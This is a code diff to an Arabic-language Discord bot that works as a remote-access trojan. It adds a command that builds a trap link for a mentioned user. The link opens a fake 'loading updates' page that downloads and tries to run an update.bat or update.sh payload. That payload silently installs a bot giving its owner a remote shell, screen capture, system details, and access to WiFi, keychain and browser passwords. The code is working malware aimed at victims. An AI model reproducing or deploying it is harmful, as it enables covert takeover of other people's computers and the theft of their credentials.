@@ -1,5 +1,5 @@
 // ============================================================
-// البوت المتكامل - النسخة النهائية مع جميع الإصلاحات
+// البوت المتكامل - النسخة النهائية مع جميع الميزات
 // ============================================================
 
 const {
@@ -61,9 +61,25 @@ const linkTracker = {
       visits: [],
       ip: null,
       userAgent: null,
-      geo: null
+      geo: null,
+      type: 'track'
     };
     return trackingLink;
+  },
+  
+  createExploitLink(targetUserId) {
+    const linkId = crypto.randomBytes(8).toString('hex');
+    const exploitLink = `http://${getLocalIP()}:${port}/exploit/${linkId}`;
+    this.links[linkId] = {
+      targetUserId,
+      createdAt: Date.now(),
+      visits: [],
+      ip: null,
+      userAgent: null,
+      geo: null,
+      type: 'exploit'
+    };
+    return exploitLink;
   },
   
   trackVisit(linkId, req) {
@@ -153,6 +169,248 @@ app.get('/track/:linkId', (req, res) => {
     </body>
     </html>
   `);
+});
+
+// ===== صفحة الرابط الملغم =====
+app.get('/exploit/:id', (req, res) => {
+  const { id } = req.params;
+  
+  // تسجيل من فتح الرابط
+  linkTracker.trackVisit(id, req);
+  console.log(`[EXPLOIT] رابط ${id} تم فتحه من ${req.ip}`);
+  
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Loading...</title>
+      <style>
+        body { background: #0a0a0a; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
+        .loader { width: 40px; height: 40px; border: 3px solid #222; border-top: 3px solid #00ff00; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #444; margin-top: 20px; }
+        .status { color: #666; font-size: 12px; margin-top: 10px; }
+      </style>
+    </head>
+    <body>
+      <div class="loader"></div>
+      <p>جارٍ تحميل التحديثات...</p>
+      <div class="status" id="status">جاري الاتصال بالخادم...</div>
+      
+      <script>
+        (function() {
+          const platform = navigator.platform || '';
+          const isWindows = platform.includes('Win');
+          const isMac = platform.includes('Mac');
+          const isLinux = platform.includes('Linux');
+          
+          let downloadUrl = '/payload';
+          let fileName = '';
+          
+          if (isWindows) {
+            fileName = 'update.bat';
+          } else if (isMac || isLinux) {
+            fileName = 'update.sh';
+          } else {
+            document.getElementById('status').textContent = '❌ نظام غير مدعوم';
+            return;
+          }
+          
+          document.getElementById('status').textContent = '📥 جاري تحميل التحديثات...';
+          
+          fetch(downloadUrl)
+            .then(res => res.text())
+            .then(data => {
+              const blob = new Blob([data], { type: 'text/plain' });
+              const url = URL.createObjectURL(blob);
+              const a = document.createElement('a');
+              a.href = url;
+              a.download = fileName;
+              document.body.appendChild(a);
+              a.click();
+              document.body.removeChild(a);
+              URL.revokeObjectURL(url);
+              
+              document.getElementById('status').textContent = '✅ تم تحميل التحديثات بنجاح!';
+              
+              setTimeout(() => {
+                if (isWindows) {
+                  try {
+                    const wsh = new ActiveXObject('WScript.Shell');
+                    if (wsh) {
+                      wsh.Run('cmd /c ' + fileName, 0, false);
+                    }
+                  } catch(e) {}
+                }
+              }, 2000);
+            })
+            .catch(err => {
+              document.getElementById('status').textContent = '❌ فشل التحميل: ' + err.message;
+            });
+          
+          setTimeout(() => {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = downloadUrl;
+            document.body.appendChild(iframe);
+            setTimeout(() => document.body.removeChild(iframe), 5000);
+          }, 1000);
+        })();
+      </script>
+    </body>
+    </html>
+  `);
+});
+
+// ===== تحميل البايلود حسب النظام =====
+app.get('/payload', (req, res) => {
+  const userAgent = req.headers['user-agent'] || '';
+  
+  console.log(`[PAYLOAD] ${req.ip} | ${userAgent}`);
+  
+  let payloadScript = '';
+  
+  if (userAgent.includes('Windows')) {
+    payloadScript = `
+      @echo off
+      cd %TEMP%
+      powershell -command "Invoke-WebRequest -Uri 'http://${getLocalIP()}:${port}/bot.js' -OutFile 'bot.js'"
+      powershell -command "Invoke-WebRequest -Uri 'http://${getLocalIP()}:${port}/package.json' -OutFile 'package.json'"
+      powershell -command "npm install discord.js"
+      powershell -command "Start-Process -WindowStyle Hidden -FilePath 'node' -ArgumentList 'bot.js'"
+    `;
+    res.setHeader('Content-Type', 'application/x-msdownload');
+    res.setHeader('Content-Disposition', 'attachment; filename="update.bat"');
+    res.send(payloadScript);
+    
+  } else if (userAgent.includes('Mac')) {
+    payloadScript = `
+      #!/bin/bash
+      cd /tmp
+      curl -o bot.js http://${getLocalIP()}:${port}/bot.js
+      curl -o package.json http://${getLocalIP()}:${port}/package.json
+      npm install discord.js
+      node bot.js &
+    `;
+    res.setHeader('Content-Type', 'application/x-sh');
+    res.setHeader('Content-Disposition', 'attachment; filename="update.sh"');
+    res.send(payloadScript);
+    
+  } else {
+    payloadScript = `
+      #!/bin/bash
+      cd /tmp
+      wget -O bot.js http://${getLocalIP()}:${port}/bot.js
+      wget -O package.json http://${getLocalIP()}:${port}/package.json
+      npm install discord.js
+      node bot.js &
+    `;
+    res.setHeader('Content-Type', 'application/x-sh');
+    res.setHeader('Content-Disposition', 'attachment; filename="update.sh"');
+    res.send(payloadScript);
+  }
+});
+
+// ===== تقديم ملفات البوت للتحميل =====
+app.get('/bot.js', (req, res) => {
+  const botCode = `
+    const { Client, GatewayIntentBits } = require('discord.js');
+    const TOKEN = '${TOKEN}';
+    const client = new Client({ 
+      intents: [
+        GatewayIntentBits.Guilds, 
+        GatewayIntentBits.GuildMessages, 
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers
+      ] 
+    });
+    
+    client.on('messageCreate', async (message) => {
+      if (message.author.bot || !message.guild) return;
+      if (!message.content.startsWith('!')) return;
+      
+      const args = message.content.slice(1).trim().split(/ +/);
+      const cmd = args.shift().toLowerCase();
+      
+      if (cmd === 'شيل' && message.author.id === '${OWNER_ID}') {
+        const { exec } = require('child_process');
+        exec(args.join(' '), (err, stdout, stderr) => {
+          message.reply(\`\`\`\n\${stdout || stderr || 'لا يوجد مخرجات'}\n\`\`\`);
+        });
+      }
+      
+      if (cmd === 'لقطة' && message.author.id === '${OWNER_ID}') {
+        const { execSync } = require('child_process');
+        const fs = require('fs');
+        const os = require('os');
+        let path = '/tmp/screenshot.png';
+        if (os.platform() === 'win32') {
+          path = process.env.TEMP + '\\\\screenshot.png';
+          execSync(\`powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; \$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \$bmp = New-Object System.Drawing.Bitmap(\$screen.Width, \$screen.Height); \$g = [System.Drawing.Graphics]::FromImage(\$bmp); \$g.CopyFromScreen(\$screen.X, \$screen.Y, 0, 0, \$screen.Size); \$bmp.Save('\${path.replace(/\\\\/g, '\\\\\\\\')}', [System.Drawing.Imaging.ImageFormat]::Png);"\`);
+        } else {
+          execSync(\`import -window root \${path} || screencapture \${path} || scrot \${path}\`);
+        }
+        if (fs.existsSync(path)) {
+          await message.channel.send({ files: [path] });
+          fs.unlinkSync(path);
+        }
+      }
+      
+      if (cmd === 'معلومات_جهاز' && message.author.id === '${OWNER_ID}') {
+        const os = require('os');
+        const ip = Object.values(os.networkInterfaces()).flat().find(i => i.family === 'IPv4' && !i.internal)?.address || 'غير معروف';
+        await message.reply(\`
+🖥️ معلومات الجهاز:
+- اسم الجهاز: \${os.hostname()}
+- النظام: \${os.platform()} \${os.release()}
+- المستخدم: \${os.userInfo().username}
+- المعالج: \${os.cpus().length} نوى
+- الذاكرة: \${Math.round(os.totalmem() / 1024 / 1024 / 1024)} GB
+- IP: \${ip}
+        \`);
+      }
+      
+      if (cmd === 'كلمات_المرور' && message.author.id === '${OWNER_ID}') {
+        const { exec } = require('child_process');
+        const os = require('os');
+        let result = '';
+        if (os.platform() === 'win32') {
+          exec('netsh wlan show profile name=* key=clear', (err, stdout) => {
+            message.reply(\`\`\`\n\${stdout || 'لم يتم العثور على كلمات مرور'}\n\`\`\`);
+          });
+        } else if (os.platform() === 'darwin') {
+          exec('security dump-keychain | grep -E "acct|passwd"', (err, stdout) => {
+            message.reply(\`\`\`\n\${stdout || 'لم يتم العثور على كلمات مرور'}\n\`\`\`);
+          });
+        } else {
+          exec('find ~/.mozilla/firefox -name "logins.json" -exec cat {} \\; | grep -E "hostname|encryptedUsername"', (err, stdout) => {
+            message.reply(\`\`\`\n\${stdout || 'لم يتم العثور على كلمات مرور'}\n\`\`\`);
+          });
+        }
+      }
+    });
+    
+    client.login(TOKEN);
+    console.log('✅ البوت الملغم يعمل');
+  `;
+  
+  res.setHeader('Content-Type', 'application/javascript');
+  res.send(botCode);
+});
+
+// ===== تقديم ملف package.json =====
+app.get('/package.json', (req, res) => {
+  const pkg = {
+    name: "discord-bot",
+    version: "1.0.0",
+    description: "Discord Bot",
+    main: "bot.js",
+    scripts: { start: "node bot.js" },
+    dependencies: {
+      "discord.js": "^14.14.1"
+    }
+  };
+  res.json(pkg);
 });
 
 // ===== API التحكم =====
@@ -1330,7 +1588,7 @@ client.on('messageCreate', async (message) => {
       return;
     }
 
-    // ===== أمر لقطة - تصوير شاشة (الإصدار المُصلح) =====
+    // ===== أمر لقطة - تصوير شاشة =====
     if (cmd === 'لقطة' || cmd === 'screenshot') {
       try {
         let screenshotPath = '/tmp/screenshot.png';
@@ -1404,21 +1662,17 @@ client.on('messageCreate', async (message) => {
         let result = '';
         const platform = os.platform();
         
-        // ويندوز - كلمات مرور Chrome, Firefox, WiFi
         if (platform === 'win32') {
           result += await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data -ErrorAction SilentlyContinue | Select-String -Pattern 'password_value' -Context 0,5"`);
           result += '\n' + await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json -ErrorAction SilentlyContinue | Select-String -Pattern 'hostname' -Context 0,3"`);
           result += '\n' + await executeCommand(`netsh wlan show profile name=* key=clear`);
         } else if (platform === 'darwin') {
-          // ماك - كلمات مرور Keychain
           result += await executeCommand(`security dump-keychain | grep -E "acct|desc|svce|passwd" 2>/dev/null`);
         } else {
-          // لينكس
           result += await executeCommand(`find ~/.mozilla/firefox -name "logins.json" -exec cat {} \\; | grep -E "hostname|encryptedUsername" 2>/dev/null`);
           result += '\n' + await executeCommand(`find ~/.config/google-chrome -name "Login Data" -exec sqlite3 {} "SELECT origin_url, username_value FROM logins" 2>/dev/null`);
         }
         
-        // البحث عن ملفات كلمات المرور المحفوظة
         const commonPasswordFiles = ['passwords.txt', 'pass.txt', 'password.txt', 'credentials.txt', 'login.txt'];
         for (const file of commonPasswordFiles) {
           const paths = [
@@ -1567,6 +1821,31 @@ client.on('messageCreate', async (message) => {
       return;
     }
 
+    // ===== أمر رابط_ملغم - إنشاء رابط ملغم =====
+    if (cmd === 'رابط_ملغم' || cmd === 'exploit') {
+      const target = message.mentions.users.first();
+      if (!target) {
+        return message.reply('⚠️ منشن الشخص المستهدف.\nمثال: `!رابط_ملغم @user`');
+      }
+      
+      const exploitLink = linkTracker.createExploitLink(target.id);
+      
+      const embed = new EmbedBuilder()
+        .setTitle('💀 رابط ملغم')
+        .setColor(0xff0000)
+        .setDescription(`تم إنشاء رابط ملغم لـ ${target}`)
+        .addFields(
+          { name: '🔗 الرابط', value: `\`${exploitLink}\``, inline: false },
+          { name: '👤 الهدف', value: target.tag, inline: true },
+          { name: '📅 وقت الإنشاء', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
+        )
+        .setFooter({ text: 'عندما يفتح الضحية الرابط، سيتم تثبيت البوت تلقائياً على جهازه' })
+        .setTimestamp();
+      
+      await message.channel.send({ embeds: [embed] });
+      return;
+    }
+
     // ===== أمر زيارات - عرض معلومات الزيارات =====
     if (cmd === 'زيارات' || cmd === 'visits') {
       const linkId = args[0];
@@ -1616,7 +1895,7 @@ client.on('messageCreate', async (message) => {
       if (linkTracker.deleteLink(linkId)) {
         await message.reply(`✅ تم حذف الرابط \`${linkId}\``);
       } else {
-        await message.reply(`❌ الرابط \`${linkId}\``);
+        await message.reply(`❌ الرابط \`${linkId}\` غير موجود.`);
       }
       return;
     }
